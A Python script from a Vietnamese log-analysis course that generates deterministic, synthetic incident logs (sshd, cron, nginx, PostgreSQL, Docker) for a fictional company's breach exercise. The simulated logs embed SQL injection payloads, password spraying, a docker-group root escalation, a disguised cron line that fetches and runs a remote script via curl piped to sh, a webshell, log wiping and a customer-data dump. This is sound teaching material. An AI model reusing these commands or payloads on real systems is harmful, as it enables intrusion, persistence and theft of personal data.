#!/usr/bin/env python3
# tao-su-co.py — sinh BỘ DỮ LIỆU SỰ CỐ ĐA NGUỒN của Chương 18 (dự án cuối khoá), khoá "Đọc & làm chủ log từ A–Z" (cuongthai.com).
#   python3 tao-su-co.py [thư mục]   → <thư mục>/su-co18/  (đề bài + log của 3 máy, KHÔNG có đáp án)
# Công ty giả định "Hoa Sen Travel" (đặt tour nhỏ, 6 người): VPS vps01 (Ubuntu 24.04: sshd, cron, rsyslog + journald, nginx + PHP-FPM cho blog
# WordPress cũ, Docker: tour-api Node.js/pino + tour-db PostgreSQL 16), router văn phòng rt01 (kiểu OpenWrt: dnsmasq + tường lửa, đường hầm
# WireGuard về vps01), máy Windows 11 PC-DEV01 của lập trình viên Minh (bản xuất Security log dạng JSON).
# Vì sao SINH thay vì tấn công thật: dựng tấn công lên máy thật không phải việc của khoá đọc log. Đây là log GIẢ LẬP tất định (chạy lại ⇒ giống
# từng byte) nhưng đúng định dạng: rsyslog RFC 3339 + sshd/sudo/cron của Ubuntu 24.04 (đối chiếu máy ảo Ch7–8), journalctl -o json (đối chiếu Ch7),
# containerd/systemd scope (đối chiếu máy Fedora chạy Docker 24/11/2026), PostgreSQL 16 csvlog (đối chiếu postgres:16 thật 24/11/2026: 16.16),
# nginx combined + $request_id, pino, docker json-file, OpenWrt logread, Get-WinEvent → JSON (Ch3–5).
# Mọi IP thuộc dải tài liệu RFC 5737 (192.0.2.x, 198.51.100.x, 203.0.113.x), 198.18.0.0/15 (RFC 2544), 100.64.0.0/10 (CGNAT) hoặc dải nội bộ; tên miền .example.
import csv, hashlib, io, json, os, sys
from datetime import datetime, timedelta, timezone

GOC = os.path.join(os.path.abspath(os.path.expanduser(sys.argv[1] if len(sys.argv) > 1 else ".")), "su-co18")
VN = timezone(timedelta(hours=7)); UTC = timezone.utc
BAT_DAU, KET_THUC = "2026-11-15 00:00:00", "2026-11-23 09:10:00"
LECH_RT01 = 97          # đồng hồ router chậm 97 giây (không có NTP) — người học phải TỰ tìm ra

class Lcg:
    def __init__(self, seed): self.s = seed & 0xFFFFFFFF
    def next(self):
        self.s = (1103515245 * self.s + 12345) & 0x7FFFFFFF
        return self.s
    def num(self, n): return (self.next() >> 16) % n
    def pick(self, xs): return xs[self.num(len(xs))]

r = Lcg(1818)
def ghi(rel, lines):
    p = os.path.join(GOC, rel); os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8", newline="\n") as f: f.write("\n".join(lines) + ("\n" if lines else ""))
THANG = "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(); THU = "Mon Tue Wed Thu Fri Sat Sun".split()
def vn(s): return datetime.strptime(s, "%Y-%m-%d %H:%M:%S").replace(tzinfo=VN)
def clf(t): return f"{t.day:02d}/{THANG[t.month-1]}/{t.year}:{t:%H:%M:%S} +0700"
def r3339(t): return t.strftime("%Y-%m-%dT%H:%M:%S.%f") + "+07:00"
def hexs(s, n): return hashlib.sha256(s.encode()).hexdigest()[:n]
def rid(): return "".join("0123456789abcdef"[r.num(16)] for _ in range(32))
T0, T1 = vn(BAT_DAU), vn(KET_THUC)
def ngay_lam(d): return d.weekday() < 5

class Nhat:
    def __init__(self): self.d = []
    def them(self, t, s): self.d.append((t, len(self.d), s))
    def dong(self): return [s for _, _, s in sorted(self.d)]

# ───────────────────────── vps01 ─────────────────────────
H = "vps01"; VPS_IP = "192.0.2.10"; VP = "192.0.2.200"   # VP = IP công cộng của văn phòng (sau rt01)
ID_API = hexs("tour-api-20261118", 64); ID_DB = hexs("tour-db-20261001", 64); ID_KE = hexs("lgz18-alpine-chroot", 64)
journal, auth_all, sysl, acc, err, app, pg, docker_api = [], Nhat(), Nhat(), Nhat(), Nhat(), Nhat(), [], Nhat()
def np(t): return 1000 + int((t - T0).total_seconds() * 1000) // 450
FAC = {"auth": 4, "authpriv": 10, "cron": 9, "daemon": 3, "kern": 0, "syslog": 5}
def J(t, prog, msg, fac="authpriv", pid=None, unit=None, prio=6, comm=None):
    """Mọi dòng vào journald; rsyslog chép ra auth.log (auth/authpriv) hoặc syslog (còn lại) — theo 50-default.conf của Ubuntu."""
    t = t + timedelta(microseconds=r.num(40000))
    e = {"__REALTIME_TIMESTAMP": str(int(t.timestamp() * 1_000_000)), "_HOSTNAME": H, "SYSLOG_FACILITY": str(FAC[fac]), "PRIORITY": str(prio),
         "SYSLOG_IDENTIFIER": prog}
    if pid: e["_PID"] = str(pid)
    if unit: e["_SYSTEMD_UNIT"] = unit
    if comm: e["_COMM"] = comm
    e["MESSAGE"] = msg; journal.append((t, len(journal), e))
    dong = f"{r3339(t)} {H} {prog}{f'[{pid}]' if pid else ''}: {msg}"
    (auth_all if fac in ("auth", "authpriv") else sysl).them(t, dong)

def ssh_hong(t, u, ip, co_that):
    p = np(t); port = 30000 + r.num(30000)
    if co_that:
        J(t, "sshd", f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={u}", pid=p, unit="ssh.service")
        J(t + timedelta(seconds=2), "sshd", f"Failed password for {u} from {ip} port {port} ssh2", pid=p, unit="ssh.service")
        J(t + timedelta(seconds=2, milliseconds=300), "sshd", f"Connection closed by authenticating user {u} {ip} port {port} [preauth]", pid=p, unit="ssh.service")
    else:
        J(t, "sshd", f"Invalid user {u} from {ip} port {port}", pid=p, unit="ssh.service")
        J(t + timedelta(milliseconds=200), "sshd", "pam_unix(sshd:auth): check pass; user unknown", pid=p, unit="ssh.service")
        J(t + timedelta(milliseconds=210), "sshd", f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}", pid=p, unit="ssh.service")
        J(t + timedelta(seconds=2), "sshd", f"Failed password for invalid user {u} from {ip} port {port} ssh2", pid=p, unit="ssh.service")
        J(t + timedelta(seconds=2, milliseconds=300), "sshd", f"Connection closed by invalid user {u} {ip} port {port} [preauth]", pid=p, unit="ssh.service")

UID = {"an": 1000, "deploy": 1001, "minh": 1002}
KEY = {"an": "ED25519 SHA256:Zk81pQe3Lr0cVb6Nw2Xa7Ym5Ts4Hd9Fg1Uj0Ki8Lo3E", "minh": "ED25519 SHA256:mH7tQ2wZ9xLc4Vb1Np8Rk3Jd6Fs0Ga5Ye2Ui7Oo4Pq",
       "deploy": "ED25519 SHA256:dP4lOy9Cq2Wm7Xe1Rb5Tn8Kv3Hs6Zj0Fa4Gu9Ii2Ll"}
sess = [40]
def ssh_vao(t, u, ip, cach="publickey", dai=600, lenh=()):
    p = np(t); port = 40000 + r.num(20000); sess[0] += 1; s = sess[0]
    J(t, "sshd", f"Accepted {cach} for {u} from {ip} port {port} ssh2" + (f": {KEY[u]}" if cach == "publickey" else ""), pid=p, unit="ssh.service")
    J(t + timedelta(milliseconds=30), "sshd", f"pam_unix(sshd:session): session opened for user {u}(uid={UID[u]}) by {u}(uid=0)", pid=p, unit="ssh.service")
    J(t + timedelta(milliseconds=45), "systemd-logind", f"New session {s} of user {u}.", pid=741, unit="systemd-logind.service")
    for giay, cmd in lenh:
        tt = t + timedelta(seconds=giay); pad = " " * max(0, 8 - len(u))
        J(tt, "sudo", f"{pad}{u} : TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND={cmd}", fac="authpriv", comm="sudo")
        J(tt + timedelta(milliseconds=20), "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {u}(uid={UID[u]})", comm="sudo")
        J(tt + timedelta(seconds=1), "sudo", "pam_unix(sudo:session): session closed for user root", comm="sudo")
    te = t + timedelta(seconds=dai)
    J(te, "sshd", f"Received disconnect from {ip} port {port}:11: disconnected by user", pid=p, unit="ssh.service")
    J(te + timedelta(milliseconds=5), "sshd", f"Disconnected from user {u} {ip} port {port}", pid=p, unit="ssh.service")
    J(te + timedelta(milliseconds=9), "sshd", f"pam_unix(sshd:session): session closed for user {u}", pid=p, unit="ssh.service")
    J(te + timedelta(milliseconds=20), "systemd-logind", f"Session {s} logged out. Waiting for processes to exit.", pid=741, unit="systemd-logind.service")
    J(te + timedelta(milliseconds=60), "systemd-logind", f"Removed session {s}.", pid=741, unit="systemd-logind.service")
    return s, p, port

def cron(t, user, cmd, he_thong=True):
    p = np(t)
    J(t, "CRON", f"pam_unix(cron:session): session opened for user {user}(uid=0) by {user}(uid=0)", pid=p, unit="cron.service")
    J(t + timedelta(milliseconds=3), "CRON", f"({user}) CMD ({cmd})", fac="cron", pid=p, unit="cron.service")
    J(t + timedelta(seconds=1 if he_thong else 2), "CRON", f"pam_unix(cron:session): session closed for user {user}", pid=p, unit="cron.service")

def scope(t, cid, dai):
    J(t, "containerd", f'time="{t.astimezone(UTC):%Y-%m-%dT%H:%M:%S.%f}000Z" level=info msg="connecting to shim {cid}" address="unix:///run/containerd/s/{hexs(cid, 64)}" namespace=moby protocol=ttrpc version=3', fac="daemon", pid=688, unit="containerd.service")
    J(t + timedelta(milliseconds=60), "systemd", f"Started docker-{cid}.scope - libcontainer container {cid}.", fac="daemon", pid=1, unit="init.scope")
    v = "veth" + hexs(cid + "v", 7)
    for i, st in enumerate(("entered blocking state", "entered disabled state", "entered forwarding state")):
        J(t + timedelta(milliseconds=10 + 30 * i), "kernel", f"docker0: port {2 + r.num(3)}({v}) {st}", fac="kern")
    if dai is None: return
    te = t + timedelta(seconds=dai)
    J(te, "systemd", f"docker-{cid}.scope: Deactivated successfully.", fac="daemon", pid=1, unit="init.scope")
    J(te + timedelta(milliseconds=8), "containerd", f'time="{te.astimezone(UTC):%Y-%m-%dT%H:%M:%S.%f}000Z" level=info msg="shim disconnected" id={cid} namespace=moby', fac="daemon", pid=688, unit="containerd.service")
    J(te + timedelta(milliseconds=12), "kernel", f"docker0: port 3({v}) entered disabled state", fac="kern")

# ── nginx + app + PostgreSQL ──
UA = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0 Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 19_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.1 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Linux; Android 16; SM-A566E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0 Mobile Safari/537.36"]
TOUR = ["da-lat-3n2d", "phu-quoc-4n3d", "ha-giang-4n3d", "hoi-an-3n2d", "sapa-2n1d", "con-dao-3n2d"]
BLOG = ["/blog/", "/blog/2026/11/kinh-nghiem-di-da-lat-mua-dong/", "/blog/2026/10/an-gi-o-hoi-an/", "/blog/wp-content/themes/hoasen/style.css"]
def W(t, ip, meth, path, st, size, ua, ref="-", rt=None, q=None):
    q = q or rid(); rt = rt if rt is not None else (5 + r.num(60)) / 1000
    acc.them(t, f'{ip} - - [{clf(t)}] "{meth} {path} HTTP/1.1" {st} {size} "{ref}" "{ua}" rid={q} rt={rt:.3f}')
    return q
API_HOST = ID_API[:12]
def A(t, lvl, msg, q, **kw):
    ms = int(t.timestamp() * 1000) + r.num(40)
    o = {"level": lvl, "time": ms, "pid": 1, "hostname": API_HOST, "reqId": q}; o.update(kw); o["msg"] = msg
    s = json.dumps(o, ensure_ascii=False, separators=(",", ":"))
    tt = datetime.fromtimestamp(ms / 1000, UTC) + timedelta(microseconds=200 + r.num(600))
    docker_api.them(tt, json.dumps({"log": s + "\n", "stream": "stdout", "time": tt.strftime("%Y-%m-%dT%H:%M:%S.%f") + f"{r.num(1000):03d}Z"}, separators=(",", ":")))
def goi_api(t, ip, meth, path, st, ua, **kw):
    rt = (6 + r.num(70)) / 1000; q = W(t, ip, meth, path, st, 120 + r.num(4000) if st < 400 else 96, ua, rt=rt)
    A(t + timedelta(milliseconds=int(rt * 1000)), 30 if st < 400 else 40, "request completed", q, req={"method": meth, "url": path},
      res={"statusCode": st}, responseTime=int(rt * 1000) - 1, **kw)
    return q

PG_COLS = 26
pg_sid = {}
def P(t, user, db, pid, frm, line, tag, sstart, sev, code, msg, detail="", app="", btype="client backend", vxid=""):
    t = t.astimezone(UTC); ss = sstart.astimezone(UTC)
    sid = f"{int(ss.timestamp()):x}.{pid:x}"
    row = [f"{t:%Y-%m-%d %H:%M:%S}.{t.microsecond // 1000:03d} UTC", user, db, str(pid), frm, sid, str(line), tag, f"{ss:%Y-%m-%d %H:%M:%S} UTC",
           vxid, "0", sev, code, msg, detail, "", "", "", "", "", "", "", app, btype, "", "0"]
    pg.append((t, len(pg), row))
def pg_phien(t, user, app, frm_ip, cau, ket_thuc_sau, pid, hba=119, sai=False):
    t = t + timedelta(milliseconds=r.num(900))
    port = 40000 + r.num(25000); frm = f"{frm_ip}:{port}"
    P(t, "", "", pid, frm, 1, "", t, "LOG", "00000", f"connection received: host={frm_ip} port={port}", app="", btype="not initialized")
    if sai:
        P(t + timedelta(milliseconds=6), user, "tour", pid, frm, 2, "authentication", t, "FATAL", "28P01", f'password authentication failed for user "{user}"',
          detail=f'Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line {hba}: "host    all             all             all                     scram-sha-256"', vxid="3/0")
        return
    P(t + timedelta(milliseconds=6), user, "tour", pid, frm, 2, "authentication", t, "LOG", "00000",
      f'connection authenticated: identity="{user}" method=scram-sha-256 (/var/lib/postgresql/data/pg_hba.conf:{hba})', vxid=f"3/{r.num(900)}")
    P(t + timedelta(milliseconds=7), user, "tour", pid, frm, 3, "authentication", t, "LOG", "00000",
      f"connection authorized: user={user} database=tour application_name={app}", vxid=f"3/{r.num(900)}")
    n = 4
    for giay, ms, tag, sql in cau:
        P(t + timedelta(seconds=giay), user, "tour", pid, frm, n, tag, t, "LOG", "00000", f"duration: {ms}  statement: {sql}", app=app, vxid="3/0"); n += 1
    if ket_thuc_sau is None: return
    te = t + timedelta(seconds=ket_thuc_sau)
    d = te - t; h, rem = divmod(d.total_seconds(), 3600); m, s = divmod(rem, 60)
    P(te, user, "tour", pid, frm, n, "idle", t, "LOG", "00000",
      f"disconnection: session time: {int(h)}:{int(m):02d}:{s:06.3f} user={user} database=tour host={frm_ip} port={port}", app=app)

# ───────── 1) Đường nền 15/11 → 23/11 ─────────
NHIEU = ["admin", "root", "test", "ubuntu", "oracle", "user", "postgres", "git", "pi", "ftpuser", "guest", "support"]
d = T0
while d < T1:
    for h in range(24):
        t = d + timedelta(hours=h, minutes=17, seconds=1)
        if t < T1: cron(t, "root", "cd / && run-parts --report /etc/cron.hourly")
    for k in range(10 + r.num(12)):    # bot dò SSH cả ngày
        t = d + timedelta(seconds=r.num(86400))
        if t >= T1: continue
        u = r.pick(NHIEU); ssh_hong(t, u, f"198.18.{r.num(200)}.{1 + r.num(250)}", u == "root")
    # khách xem tour, gọi API, đặt tour (ít về đêm)
    for k in range(1100 + r.num(300)):
        gio = r.pick([7, 8, 9, 10, 11, 12, 13, 14, 15, 19, 20, 20, 21, 21, 22, 9, 10, 20, 0, 1, 16, 17, 18, 23])
        t = d + timedelta(hours=gio, seconds=r.num(3600))
        if t >= T1: continue
        ip = f"100.{64 + r.num(40)}.{r.num(256)}.{1 + r.num(250)}"; ua = r.pick(UA); x = r.num(10)
        if x < 3: W(t, ip, "GET", "/tour/" + r.pick(TOUR), 200, 18000 + r.num(9000), ua)
        elif x < 5: goi_api(t, ip, "GET", f"/api/tours?q={r.pick(['da lat', 'phu quoc', 'ha giang', 'bien', 'nui'])}".replace(" ", "%20"), 200, ua)
        elif x < 7: goi_api(t, ip, "GET", f"/api/tours/{100 + r.num(40)}", 200, ua)
        elif x < 8:
            st = 201 if r.num(12) else 409
            goi_api(t, ip, "POST", "/api/dat-tour", st, ua, **({} if st == 201 else {"err": "het-cho"}))
        else: W(t, ip, "GET", r.pick(BLOG), 200, 9000 + r.num(30000), ua)
    for k in range(25 + r.num(15)):    # máy quét Internet: dò WordPress/.env — nhiễu thường ngày
        t = d + timedelta(seconds=r.num(86400))
        if t >= T1: continue
        ip = f"198.18.{r.num(200)}.{1 + r.num(250)}"
        W(t, ip, r.pick(["GET", "POST"]), r.pick(["/wp-login.php", "/blog/wp-login.php", "/.env", "/blog/xmlrpc.php", "/phpmyadmin/", "/.git/config"]),
          r.pick([404, 404, 403, 200]) if True else 404, 153, "Mozilla/5.0 zgrab/0.x")
    if ngay_lam(d):
        ssh_vao(vn(f"{d:%Y-%m-%d} 09:0{r.num(10)}:{r.num(60):02d}"), "minh", VP, dai=3600 + r.num(3000))
        if d.weekday() in (1, 3):
            s0 = vn(f"{d:%Y-%m-%d} 09:2{r.num(10)}:{r.num(60):02d}")
            pg_phien(s0, "tour_admin", "DBeaver 25.2.4 - Main", "172.18.0.1",
                     [(41, f"{1180 + r.num(400)}.{r.num(999):03d} ms", "SELECT", "SELECT t.ten, count(*) AS so_khach, sum(d.tong_tien) FROM dat_tour d JOIN tour t ON t.id = d.tour_id WHERE d.ngay_dat >= now() - interval '7 days' GROUP BY t.ten ORDER BY 3 DESC")],
                     900 + r.num(600), 3000 + r.num(4000), hba=128)
    d += timedelta(days=1)
# logrotate hằng ngày 00:00 + rotate tuần của rsyslog đêm 22/11 (lần trước 15/11) — dấu mốc có thật trong syslog
d = T0 + timedelta(days=1)
while d < T1:
    t = d + timedelta(seconds=1)
    J(t, "systemd", "Starting logrotate.service - Rotate log files...", fac="daemon", pid=1, unit="init.scope")
    if d == vn("2026-11-22 00:00:00"):
        J(t + timedelta(milliseconds=900), "rsyslogd", '[origin software="rsyslogd" swVersion="8.2312.0" x-pid="802" x-info="https://www.rsyslog.com"] rsyslogd was HUPed', fac="syslog", pid=802, unit="rsyslog.service")
    J(t + timedelta(seconds=1), "systemd", "logrotate.service: Deactivated successfully.", fac="daemon", pid=1, unit="init.scope")
    J(t + timedelta(seconds=1, milliseconds=2), "systemd", "Finished logrotate.service - Rotate log files.", fac="daemon", pid=1, unit="init.scope")
    d += timedelta(days=1)
# deploy (CI từ máy dev qua văn phòng) chiều thứ Tư 18/11: kéo ảnh mới, khởi động lại tour-api
t = vn("2026-11-18 17:32:10"); ssh_vao(t, "deploy", VP, dai=95)
scope(vn("2026-11-18 17:32:52"), ID_API, None)
for i in range(10):   # pool pg của tour-api mở 10 kết nối khi khởi động
    pg_phien(vn("2026-11-18 17:32:55") + timedelta(milliseconds=40 * i), "tour_app", "tour-api", "172.18.0.3", [], None, 200 + i, hba=128)
A(vn("2026-11-18 17:32:56"), 30, "tour-api 2.14.0 đang nghe cổng 3000", "-", env="production")

# ───────── 2) Sự cố ─────────
KE1, KE2, KE3, KE = "203.0.113.50", "203.0.113.51", "203.0.113.52", "198.51.100.77"
SQLMAP = "sqlmap/1.9.11#stable (https://sqlmap.org)"
# 2a) Thứ Bảy 21/11 21:48 — dò SQL injection vào API tìm tour (bị validation chặn: 400; không có lỗi SQL nào ở PostgreSQL)
TAI = ["'", "' OR '1'='1", "1) AND 1=1-- -", "' UNION SELECT NULL--", "1 AND SLEEP(5)", "'; SELECT pg_sleep(5)--", "da lat' AND 1=2-- -", "%27%29%29"]
t = vn("2026-11-21 21:48:10")
for k in range(46):
    p = r.pick(TAI); url = "/api/tours?q=" + p.replace(" ", "%20").replace("'", "%27").replace("=", "%3D").replace(";", "%3B")
    st = 400 if k % 9 else 200
    q = W(t, KE1, "GET", url if st == 400 else "/api/tours?q=da%20lat", st, 96 if st == 400 else 2210, SQLMAP, rt=0.004)
    A(t + timedelta(milliseconds=4), 40 if st == 400 else 30, "query không hợp lệ" if st == 400 else "request completed", q, req={"method": "GET", "url": url if st == 400 else "/api/tours?q=da%20lat"},
      res={"statusCode": st}, **({"issues": [{"path": ["q"], "code": "invalid_string", "message": "chỉ cho phép chữ, số, khoảng trắng"}]} if st == 400 else {}))
    t += timedelta(seconds=7 + r.num(5))
# 2b) 22:03–22:38 — rải mật khẩu SSH: 3 đợt, 3 IP luân phiên, mỗi tài khoản 1 lần/đợt
DS = ["admin", "root", "ubuntu", "deploy", "hoasen", "minh", "an", "ketoan", "test", "postgres", "www", "dev"]
CO = {"root", "deploy", "minh", "an", "postgres"}   # tài khoản có thật trên vps01 (postgres là tài khoản hệ thống của gói client)
for dot, bd in enumerate(("22:03:12", "22:18:40", "22:33:05")):
    t = vn(f"2026-11-21 {bd}")
    for i, u in enumerate(DS):
        ip = (KE1, KE2, KE3)[(i + dot) % 3]
        if dot == 2 and u == "deploy":
            p = np(t); port = 30000 + r.num(30000)   # đợt 3 trúng: máy rải ĐĂNG NHẬP ĐƯỢC rồi thoát ngay (công cụ chỉ kiểm mật khẩu)
            J(t, "sshd", f"Accepted password for deploy from {ip} port {port} ssh2", pid=p, unit="ssh.service")
            J(t + timedelta(milliseconds=30), "sshd", "pam_unix(sshd:session): session opened for user deploy(uid=1001) by deploy(uid=0)", pid=p, unit="ssh.service")
            sess[0] += 1; J(t + timedelta(milliseconds=45), "systemd-logind", f"New session {sess[0]} of user deploy.", pid=741, unit="systemd-logind.service")
            J(t + timedelta(milliseconds=400), "sshd", f"Received disconnect from {ip} port {port}:11: Bye Bye", pid=p, unit="ssh.service")
            J(t + timedelta(milliseconds=405), "sshd", f"Disconnected from user deploy {ip} port {port}", pid=p, unit="ssh.service")
            J(t + timedelta(milliseconds=409), "sshd", "pam_unix(sshd:session): session closed for user deploy", pid=p, unit="ssh.service")
            J(t + timedelta(milliseconds=430), "systemd-logind", f"Session {sess[0]} logged out. Waiting for processes to exit.", pid=741, unit="systemd-logind.service")
            J(t + timedelta(milliseconds=470), "systemd-logind", f"Removed session {sess[0]}.", pid=741, unit="systemd-logind.service")
        else:
            ssh_hong(t, u, ip, u in CO)
        t += timedelta(seconds=14 + r.num(16))
# 2c) 22:41:07 — người điều khiển vào bằng mật khẩu từ IP khác; sudo bị từ chối; dùng nhóm docker để thành root
t_vao = vn("2026-11-21 22:41:07")
s_ke, p_ke, port_ke = ssh_vao(t_vao, "deploy", KE, cach="password", dai=41 * 60 + 3)
J(vn("2026-11-21 22:42:31"), "sudo", "  deploy : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id", fac="authpriv", comm="sudo")
t_ct = vn("2026-11-21 22:44:30"); scope(t_ct, ID_KE, 37 * 60 + 10)       # docker run --rm -it -v /:/host alpine chroot /host  (tới 23:21:40)
# 2d) 22:47:12 — bám trụ bằng cron hệ thống, tên nguỵ trang
J(vn("2026-11-21 22:48:01"), "cron", "(*system*apt-compat) RELOAD (/etc/cron.d/apt-compat)", fac="cron", pid=811, unit="cron.service")
CMD_KE = "curl -fsS http://cdn-update.example.net/u.sh | sh >/dev/null 2>&1"
t = vn("2026-11-21 22:50:01")
while t < T1:
    cron(t, "root", CMD_KE, he_thong=False); t += timedelta(minutes=10)
# 2e) 22:52–22:58 — từ trong container (NAT qua 10.8.0.1) dò mạng văn phòng qua WireGuard: DNS ngược, SYN 445/3389, đoán mật khẩu SMB vào PC-DEV01
# 2f) 23:05:44 — thả webshell vào uploads của WordPress (sửa mtime về 02/11), 23:06:02 thử lần đầu
WS = "/blog/wp-content/uploads/2026/11/cache.php"
W(vn("2026-11-21 23:06:02"), KE, "GET", WS, 200, 0, "curl/8.5.0", rt=0.011)
W(vn("2026-11-21 23:06:19"), KE, "POST", WS, 200, 34, "curl/8.5.0", rt=0.014)
# 2g) 23:19:55 — sed -i xoá khỏi auth.log mọi dòng có IP của chúng. rsyslog vẫn ghi vào inode CŨ (đã bị thay) ⇒ mất mọi dòng auth tới lần HUP 00:00:01
T_SED, T_HUP = vn("2026-11-21 23:19:55"), vn("2026-11-22 00:00:02")
# 2h) Chủ nhật 22/11 02:10 — quay lại qua webshell (www-data): đọc .env, psql vào CSDL, COPY bảng khách hàng, nén vào uploads, tải về, xoá
t = vn("2026-11-22 02:10:05")
for giay, kt in ((0, 61), (37, 1290), (71, 18)):
    W(t + timedelta(seconds=giay), KE, "POST", WS, 200, kt, "curl/8.5.0", rt=0.02 + r.num(30) / 1000)
err.them(vn("2026-11-22 02:12:48"), f'2026/11/22 02:12:48 [error] 1187#1187: *48211 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined array key "c" in /var/www/hoasen{WS} on line 1" while reading response header from upstream, client: {KE}, server: hoasen.example, request: "POST {WS} HTTP/1.1", upstream: "fastcgi://unix:/run/php/php8.3-fpm.sock:", host: "hoasen.example"')
W(vn("2026-11-22 02:12:48"), KE, "POST", WS, 200, 0, "curl/8.5.0", rt=0.009)
W(vn("2026-11-22 02:13:39"), KE, "POST", WS, 200, 92, "curl/8.5.0", rt=0.081)
pg_phien(vn("2026-11-22 02:13:39"), "postgres", "psql", "172.18.0.1", [], 0, 5121, sai=True)
W(vn("2026-11-22 02:14:18"), KE, "POST", WS, 200, 7, "curl/8.5.0", rt=9.412)
pg_phien(vn("2026-11-22 02:14:18"), "tour_app", "psql", "172.18.0.1",
         [(9, "8412.330 ms", "COPY", "COPY (SELECT ho_ten, email, so_dien_thoai, so_ho_chieu, ngay_sinh FROM khach_hang) TO STDOUT WITH (FORMAT csv, HEADER)")], 9.3, 5133)
W(vn("2026-11-22 02:16:30"), KE, "POST", WS, 200, 0, "curl/8.5.0", rt=1.904)
W(vn("2026-11-22 02:19:12"), KE, "GET", "/blog/wp-content/uploads/2026/11/kh.csv.gz", 200, 3486215, "curl/8.5.0", rt=4.733)
W(vn("2026-11-22 02:21:02"), KE, "POST", WS, 200, 0, "curl/8.5.0", rt=0.012)
W(vn("2026-11-22 02:21:40"), KE, "GET", "/blog/wp-content/uploads/2026/11/kh.csv.gz", 404, 153, "curl/8.5.0", rt=0.001)
W(vn("2026-11-22 02:31:20"), KE, "POST", WS, 200, 0, "curl/8.5.0", rt=0.010)
# 2i) Thứ Hai 23/11: Minh thấy báo cáo buổi sáng có 4740 ⇒ An (quản trị) vào vps01 bằng khoá, thu thập bằng chứng
ssh_vao(vn("2026-11-23 08:41:12"), "an", VP, dai=25 * 60, lenh=[(40, "/usr/bin/journalctl -o json --since 2026-11-15 --until 2026-11-23 09:10"),
        (95, "/usr/bin/tar czf /root/thu-thap-vps01.tgz /var/log /etc/cron.d /etc/ssh/sshd_config.d"), (140, "/usr/bin/docker logs tour-api"),
        (190, "/usr/bin/stat /var/www/hoasen/blog/wp-content/uploads/2026/11/cache.php /var/log/auth.log.1")])

# ── Ghi vps01: áp hành vi xoá log rồi rotate ──
auth_dong = sorted(auth_all.d)
tuan_truoc, tuan_nay = [], []
for t, _, s in auth_dong:
    if t < T_HUP:
        if T_SED <= t < T_HUP: continue                                   # ghi vào inode đã bị thay ⇒ mất
        if t < T_SED and any(ip in s for ip in (KE1, KE2, KE3, KE)): continue   # sed -i '/203\.0\.113\.5\|198\.51\.100\.77/d'
        tuan_truoc.append(s)
    else: tuan_nay.append(s)
ghi("vps01/var/log/auth.log.1", tuan_truoc); ghi("vps01/var/log/auth.log", tuan_nay)
sy = sysl.dong(); hup = r3339(T_HUP)[:19]
ghi("vps01/var/log/syslog.1", [s for s in sy if s[:19] < hup]); ghi("vps01/var/log/syslog", [s for s in sy if s[:19] >= hup])
ghi("vps01/journal/vps01-journal.json", [json.dumps(e, ensure_ascii=False, separators=(",", ":")) for _, _, e in sorted(journal, key=lambda x: (x[0], x[1]))])
ghi("vps01/var/log/nginx/access.log", acc.dong()); ghi("vps01/var/log/nginx/error.log", err.dong())
T_TAO = vn("2026-11-18 17:32:52")   # container tour-api được TẠO LẠI lúc deploy 18/11 ⇒ log json-file của container cũ đã mất theo nó
ghi(f"vps01/var/lib/docker/containers/{ID_API}/{ID_API}-json.log", [s for t, _, s in sorted(docker_api.d) if t >= T_TAO])
buf = {}
for t, _, row in sorted(pg):
    ten = f"postgresql-{THU[t.weekday()]}.csv"
    q = lambda x: '"' + x.replace('"', '""') + '"'   # csvlog của PostgreSQL: trường chữ có giá trị luôn trong nháy kép, tag/ứng dụng/loại tiến trình luôn có nháy
    o = [q(v) if (i in (1, 2, 4, 14) and v) or i in (7, 13, 22, 23) else v for i, v in enumerate(row)]
    buf.setdefault(ten, []).append(",".join(o))
for ten, ls in buf.items(): ghi(f"vps01/postgresql/log/{ten}", ls)
# Bằng chứng An thu thập sáng 23/11 (output lệnh, chép nguyên)
ghi("vps01/thu-thap/README.txt", ["Do An (quản trị) thu thập trên vps01 sáng 23/11/2026 08:41–09:06 (+07:00), bằng tài khoản an (sudo).",
    "Mỗi tệp .txt là output nguyên văn của một lệnh, dòng đầu là lệnh."])
ghi("vps01/thu-thap/id-deploy.txt", ["$ id deploy", "uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),988(docker)"])
ghi("vps01/thu-thap/sshd-T.txt", ["$ sudo sshd -T | grep -E '^(passwordauthentication|permitrootlogin|maxauthtries|loglevel) '",
    "loglevel INFO", "permitrootlogin without-password", "maxauthtries 6", "passwordauthentication yes",
    "$ grep -r PasswordAuthentication /etc/ssh/sshd_config.d/", "/etc/ssh/sshd_config.d/50-cloud-init.conf:PasswordAuthentication yes"])
ghi("vps01/thu-thap/cron.d.txt", ["$ ls -l --time-style=full-iso /etc/cron.d/",
    "total 12", "-rw-r--r-- 1 root root  91 2026-11-21 22:47:12.390817442 +0700 apt-compat", "-rw-r--r-- 1 root root 201 2024-04-22 13:08:16.000000000 +0700 e2scrub_all",
    "-rw-r--r-- 1 root root 712 2024-01-03 01:59:52.000000000 +0700 php", "$ cat /etc/cron.d/apt-compat", "# apt compat check", f"*/10 * * * * root {CMD_KE}"])
ghi("vps01/thu-thap/stat.txt", ["$ sudo stat /var/www/hoasen/blog/wp-content/uploads/2026/11/cache.php /var/log/auth.log.1",
    "  File: /var/www/hoasen/blog/wp-content/uploads/2026/11/cache.php", "  Size: 31        	Blocks: 8          IO Block: 4096   regular file",
